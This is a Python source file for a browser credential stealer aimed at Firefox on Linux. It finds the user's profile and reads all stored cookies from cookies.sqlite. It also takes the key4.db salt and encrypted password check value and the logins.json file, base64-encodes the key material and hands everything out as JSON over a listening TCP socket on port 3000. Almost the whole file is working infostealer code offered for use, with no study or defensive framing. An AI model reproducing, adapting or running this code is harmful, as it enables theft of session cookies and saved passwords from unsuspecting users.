from abc import ABC, abstractmethod
import os, socket, platform, sqlite3, base64, json;


# * Classes to detect Operating System
class OSInterface(ABC):
    @abstractmethod
    def DetectOperatingSystem(self):
        pass


class OSDetector(OSInterface):

    def __init__(self):
        pass

    @staticmethod
    def DetectOperatingSystem():
        return platform.system();



# * Classes to search profile directories in different browsers
class ProfileDirectoryFinder(ABC):
    @abstractmethod
    def FindProfileDirectoryInLinux():
        pass

    @abstractmethod 
    def FindProfileDirectoryInWindows():
        pass


class FirefoxProfileFinder(ProfileDirectoryFinder):
    
    def __init__(self):
        pass

    def FindProfileDirectoryInLinux(self):

        homeDirectory = os.path.expanduser("~");
        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")


        if ".mozilla" not in os.listdir(homeDirectory):
            raise FileNotFoundError("Firefox not installed")


        for directory in os.listdir(browserDirectory):

            if(directory.endswith(".default-esr")):
                browserDirectory = os.path.join(browserDirectory, directory);
                return browserDirectory

            elif(directory.endswith(".default")):
                browserDirectory = os.path.join(browserDirectory, directory); 
                return browserDirectory
            

        raise FileNotFoundError("Firefox profile directory not found")
         


    def FindProfileDirectoryInWindows(self):
        pass

    
    
    

# * Classes to obtain Browser Cookies
class BrowserCookiesGetter(ABC):

    @abstractmethod
    def GetCookiesInLinux(self):
        pass

    @abstractmethod
    def GetCookiesInWindows(self):
        pass

    


class FirefoxCookiesGetter(BrowserCookiesGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder): 
        self.profileFinder = profileFinder;


    def GetCookiesInLinux(self):

        try: 

            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
            cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");


            if not os.path.exists(cookiesDbPath):
                raise FileNotFoundError("Cookies database not found!");



            connection = sqlite3.connect(cookiesDbPath)
            cursor = connection.cursor()
            cursor.execute('SELECT name, value, host FROM moz_cookies')
            cookies = cursor.fetchall()
            connection.close()



            cookiesData = []

            for register in cookies:

                cookiesData.append({
                    "name": register[0],
                    "cookie": register[1],
                    "host": register[2]
                });



            return cookiesData;

        except Exception as e:
            return f"Database is locked {e}";
            


    def GetCookiesInWindows(self):
        pass




# * Classes to get saved passwords in browsers 
class BrowserPasswordsGetter(ABC):

    @abstractmethod
    def GetPasswordInLinux(self):
        pass

    @abstractmethod
    def GetPasswordsInWindows(self):
        pass



class FirefoxPasswordsGetter(BrowserPasswordsGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder):
        self.profileFinder = profileFinder;


    def GetPasswordInLinux(self):


        try:

            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
            keyDbPath = os.path.join(browserDirectory, "key4.db");             
            loginsFilePath = os.path.join(browserDirectory, "logins.json")


            if(not os.path.exists(keyDbPath) or not os.path.exists(loginsFilePath)): 
                raise FileNotFoundError("Key4.db or logins.json not exists!");



            salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password';");


            print(f"Item1 (salt): {salt}");
            print(f"Item2 (Contraseña Base): {item2}");
            
            return salt, item2, loginsFilePath;
            
           
        except Exception as e:
            print(e)
        


    def GetPasswordsInWindows(self):
        return "Logic"

        
    def __ExecuteSQLQuery(self, dbPath, sqlQuery):
        with sqlite3.connect(dbPath) as db:

            cursor = db.cursor()
            cursor.execute(sqlQuery);
            results = cursor.fetchone()

        return results;



# * Classes to send Browser credentials with Sockets
class SocketSender(ABC):

    @abstractmethod
    def ExtractDataFromFile(self):
        pass

    @abstractmethod
    def SendData(self):
        pass
        

    
class BrowserDataSender(SocketSender):

    def __init__(self, port, ip=''):
        self._ip = ip;
        self._port = port;
        self.__serverSocket = None;
        self.__clientSocket = None;

        


    def EstablishConnection(self):
        #Create Connection 
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

        serverAddress = (self._ip, self._port);        
        serverSocket.bind(serverAddress);
        serverSocket.listen();

        self.__clientSocket, clientAddress = serverSocket.accept()
        self.__serverSocket = serverSocket;




    def ExtractDataFromFile(self, path):
        
        if(not os.path.exists(path)): raise FileNotFoundError("File not exists!");

        with open(path, "r") as File:
            return File.read();
        

    def SendData(self, data={}):
        
        try:
            self.__clientSocket.sendall(str(data).encode());
            
        except Exception as e:
            print(f"Error! {e}");


    def CloseConnection(self):
        self.__clientSocket.close();
        self.__serverSocket.close();




def Main():



    if(not OSDetector.DetectOperatingSystem() == "Linux"):
        pass

    
    browserSearcher = FirefoxProfileFinder();
    CookiesGetter = FirefoxCookiesGetter(browserSearcher);
    sender = BrowserDataSender(3000);
    
    cookies = CookiesGetter.GetCookiesInLinux();
    PasswordsGetter = FirefoxPasswordsGetter(browserSearcher);


    salt, item2, loginsFilePath = PasswordsGetter.GetPasswordInLinux();




    sender.EstablishConnection()
    sender.SendData(data=json.dumps({
        "cookies": cookies,
        "logins.json": sender.ExtractDataFromFile(loginsFilePath),        
        "decrypt": {
            "salt": base64.b64encode(salt).decode("utf-8"),
            "item2": base64.b64encode(item2).decode("utf-8")
        }
    
    }));
    
    
    sender.CloseConnection();
    



if __name__ == "__main__":
    Main()
